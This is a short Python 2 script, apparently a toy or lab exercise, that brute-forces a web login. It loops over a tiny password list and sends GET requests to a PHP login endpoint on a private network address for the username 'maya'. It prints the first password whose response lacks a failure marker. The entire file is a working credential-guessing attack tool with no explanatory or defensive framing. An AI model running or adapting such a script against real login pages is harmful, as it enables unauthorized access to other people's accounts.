import requests

blaaaah =['hi','bye']

def brute_forcer(username):
        for i in blaaaah:
            url = 'http://192.168.0.42/controller/controller_login.php?username='+username+'&password='+i
            r = requests.get(url)
            if 'abc' in r.text:
                continue
            else:
                print i
                break

brute_forcer("maya")
